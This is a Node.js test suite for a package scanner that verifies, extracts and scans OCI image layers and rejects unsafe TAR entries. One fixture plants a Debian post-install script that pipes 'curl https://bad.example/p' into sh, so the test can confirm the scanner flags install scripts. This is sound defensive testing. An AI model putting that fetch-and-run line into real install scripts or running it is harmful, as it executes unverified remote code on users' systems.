"use strict";

const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const { EventEmitter } = require("node:events");
const fsp = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const { PassThrough } = require("node:stream");
const test = require("node:test");
const zlib = require("node:zlib");

const { parseTar } = require("../src/distribution/oci-recursive");
const { isResolvableComponent, scanRecursiveComponents } = require("../src/distribution/recursive");

function digest(bytes) {
  return `sha256:${crypto.createHash("sha256").update(bytes).digest("hex")}`;
}

function octal(header, offset, length, value) {
  const text = value.toString(8).padStart(length - 1, "0") + "\0";
  header.write(text, offset, length, "ascii");
}

function tar(entries) {
  const chunks = [];
  for (const entry of entries) {
    const content = Buffer.from(entry.content || "");
    const header = Buffer.alloc(512);
    header.write(entry.name, 0, 100, "utf8");
    octal(header, 100, 8, entry.type === "5" ? 0o755 : 0o644);
    octal(header, 108, 8, 0);
    octal(header, 116, 8, 0);
    octal(header, 124, 12, content.length);
    octal(header, 136, 12, 0);
    header.fill(0x20, 148, 156);
    header[156] = (entry.type || "0").charCodeAt(0);
    header.write("ustar\0", 257, 6, "ascii");
    header.write("00", 263, 2, "ascii");
    let checksum = 0;
    for (const byte of header) checksum += byte;
    header.write(checksum.toString(8).padStart(6, "0"), 148, 6, "ascii");
    header[154] = 0;
    header[155] = 0x20;
    chunks.push(header, content, Buffer.alloc((512 - content.length % 512) % 512));
  }
  chunks.push(Buffer.alloc(1024));
  return Buffer.concat(chunks);
}

async function writeBlob(root, bytes, forcedDigest = digest(bytes)) {
  const file = path.join(root, "blobs", "sha256", forcedDigest.slice(7));
  await fsp.mkdir(path.dirname(file), { recursive: true });
  await fsp.writeFile(file, bytes);
  return forcedDigest;
}

async function ociLayout(t, options = {}) {
  const root = await fsp.mkdtemp(path.join(os.tmpdir(), "pkgxray-oci-test-"));
  t.after(() => fsp.rm(root, { recursive: true, force: true }));
  const uncompressed = options.tar || tar([
    { name: "DEBIAN/postinst", content: "#!/bin/sh\ncurl https://bad.example/p | sh\n" },
    { name: "package.spec", content: "%post\necho configured\n" },
    { name: "package.post-install", content: "#!/bin/sh\necho installed\n" }
  ]);
  const compressed = options.compressed || zlib.gzipSync(uncompressed);
  const layerDigest = await writeBlob(root, compressed);
  const config = Buffer.from(JSON.stringify({
    architecture: "amd64",
    os: "linux",
    rootfs: { type: "layers", diff_ids: [digest(uncompressed)] }
  }));
  const configDigest = await writeBlob(root, config);
  const layerMediaType = options.layerMediaType || "application/vnd.oci.image.layer.v1.tar+gzip";
  const manifest = Buffer.from(JSON.stringify({
    schemaVersion: 2,
    mediaType: "application/vnd.oci.image.manifest.v1+json",
    config: { mediaType: "application/vnd.oci.image.config.v1+json", digest: configDigest, size: config.length },
    layers: [{ mediaType: layerMediaType, digest: layerDigest, size: compressed.length }]
  }));
  const manifestDigest = await writeBlob(root, manifest);
  await fsp.writeFile(path.join(root, "oci-layout"), JSON.stringify({ imageLayoutVersion: "1.0.0" }));
  await fsp.writeFile(path.join(root, "index.json"), JSON.stringify({
    schemaVersion: 2,
    manifests: [{ mediaType: "application/vnd.oci.image.manifest.v1+json", digest: manifestDigest, size: manifest.length }]
  }));
  return { root, manifestDigest, layerDigest, manifest, config, compressed, uncompressed };
}

test("immutable local OCI layouts verify objects, extract safely, and scan package scripts", async t => {
  const fixture = await ociLayout(t);
  const result = await scanRecursiveComponents({
    root: fixture.root,
    components: [{ kind: "oci-manifest", reference: fixture.manifestDigest, digest: fixture.manifestDigest, size: fixture.manifest.length }]
  }, { acquireOci: true });

  assert.equal(result.coverage.complete, true);
  assert.equal(result.nodes.length, 1);
  assert.equal(result.nodes[0].status, "scanned");
  assert.equal(result.nodes[0].source, "local-oci-layout");
  assert.equal(result.nodes[0].result.root, undefined);
  assert.equal(result.nodes[0].result.verification.extractedRootRetained, false);
  assert.equal(result.nodes[0].result.verification.manifest, fixture.manifestDigest);
  assert.equal(result.nodes[0].result.verification.layers[0].digest, fixture.layerDigest);
  assert.ok(result.nodes[0].result.components.some(component => component.kind === "deb-install-script"));
  assert.ok(result.nodes[0].result.components.some(component => component.kind === "rpm-install-script"));
  assert.ok(result.nodes[0].result.components.some(component => component.kind === "apk-install-script"));
  assert.ok(result.nodes[0].result.findings.some(finding => finding.category === "install-script"));
  assert.equal(result.verdict, "review");
});

test("OCI recursion rejects mutable references and requires an explicit registry allowlist", async () => {
  const mutable = await scanRecursiveComponents({ components: [
    { kind: "oci-image", reference: "registry.example/org/image:latest" }
  ] }, { acquireOci: true });
  assert.equal(mutable.nodes[0].status, "error");
  assert.match(mutable.nodes[0].error, /exact sha256 digest/);

  const disagreeing = await scanRecursiveComponents({ components: [
    { kind: "oci-image", reference: `registry.example/org/image@sha256:${"a".repeat(64)}`, digest: `sha256:${"b".repeat(64)}` }
  ] }, { acquireOci: true });
  assert.equal(disagreeing.nodes[0].status, "error");
  assert.match(disagreeing.nodes[0].error, /digest disagrees/);

  const exact = await scanRecursiveComponents({ components: [
    { kind: "oci-image", reference: `registry.example/org/image@sha256:${"a".repeat(64)}` }
  ] }, { acquireOci: true });
  assert.equal(exact.nodes[0].status, "error");
  assert.match(exact.nodes[0].error, /explicit allowedHosts/);
});

test("anonymous registry authentication failures remain coverage-visible", async () => {
  const transport = {
    get(url, options, receive) {
      const request = new EventEmitter();
      request.destroy = () => {};
      process.nextTick(() => {
        const response = new PassThrough();
        response.statusCode = 401;
        response.headers = {};
        response.destroy = PassThrough.prototype.destroy.bind(response);
        receive(response);
        response.end("authentication required");
      });
      return request;
    }
  };
  const result = await scanRecursiveComponents({ components: [
    { kind: "oci-image", reference: `registry.example/org/image@sha256:${"b".repeat(64)}` }
  ] }, {
    acquireOci: true,
    ociOptions: { allowedHosts: ["registry.example"], lookup: (host, options, callback) => callback(null, "203.0.113.10", 4), transport }
  });
  assert.equal(result.nodes[0].status, "error");
  assert.match(result.nodes[0].error, /authentication is not supported/);
  assert.match(result.coverage.reasons.join("\n"), /authentication is not supported/);
});

test("OCI layers reject whiteouts, traversal, links, and unsupported compression", async t => {
  assert.throws(() => parseTar(tar([{ name: "../escape", content: "bad" }])), /Unsafe TAR entry path/);
  assert.throws(() => parseTar(tar([{ name: "link", type: "2", content: "target" }])), /links, devices/);
  assert.throws(() => parseTar(tar([
    { name: "Foo/one", content: "one" },
    { name: "foo/two", content: "two" }
  ])), /case collision/);

  const whiteout = await ociLayout(t, { tar: tar([{ name: "etc/.wh.deleted", content: "" }]) });
  const whiteoutResult = await scanRecursiveComponents({
    root: whiteout.root,
    components: [{ kind: "oci-manifest", reference: whiteout.manifestDigest }]
  }, { acquireOci: true });
  assert.equal(whiteoutResult.nodes[0].status, "error");
  assert.match(whiteoutResult.nodes[0].error, /whiteout semantics are not supported/);

  const zstd = await ociLayout(t, { layerMediaType: "application/vnd.oci.image.layer.v1.tar+zstd" });
  const zstdResult = await scanRecursiveComponents({
    root: zstd.root,
    components: [{ kind: "oci-manifest", reference: zstd.manifestDigest }]
  }, { acquireOci: true });
  assert.equal(zstdResult.nodes[0].status, "error");
  assert.match(zstdResult.nodes[0].error, /Unsupported OCI layer media type/);
});

test("OCI object digest mismatches fail closed and layer/config descriptors are not recursed independently", async t => {
  const fixture = await ociLayout(t);
  await fsp.writeFile(path.join(fixture.root, "blobs", "sha256", fixture.layerDigest.slice(7)), "tampered");
  const result = await scanRecursiveComponents({
    root: fixture.root,
    components: [
      { kind: "oci-manifest", reference: fixture.manifestDigest },
      { kind: "oci-config", reference: `sha256:${"c".repeat(64)}` },
      { kind: "oci-layer", reference: `sha256:${"d".repeat(64)}` }
    ]
  }, { acquireOci: true });
  assert.equal(result.nodes.length, 1);
  assert.equal(result.nodes[0].status, "error");
  assert.match(result.nodes[0].error, /size mismatch|digest mismatch/);
  assert.equal(result.coverage.ignoredMetadataComponents, 2);
  assert.equal(isResolvableComponent({ kind: "oci-layer", reference: fixture.layerDigest }), false);
});

test("OCI extraction enforces aggregate entry and compressed-layer bounds", async t => {
  const fixture = await ociLayout(t, { tar: tar([
    { name: "usr/bin/one", content: "one" },
    { name: "usr/bin/two", content: "two" }
  ]) });
  const component = { kind: "oci-manifest", reference: fixture.manifestDigest };
  const entries = await scanRecursiveComponents({ root: fixture.root, components: [component] }, {
    acquireOci: true,
    ociOptions: { maxEntries: 1 }
  });
  assert.equal(entries.nodes[0].status, "error");
  assert.match(entries.nodes[0].error, /exceeds 1 entries/);

  const bytes = await scanRecursiveComponents({ root: fixture.root, components: [component] }, {
    acquireOci: true,
    ociOptions: { maxLayerBytes: fixture.compressed.length - 1 }
  });
  assert.equal(bytes.nodes[0].status, "error");
  assert.match(bytes.nodes[0].error, /exceeds .* bytes/);
});
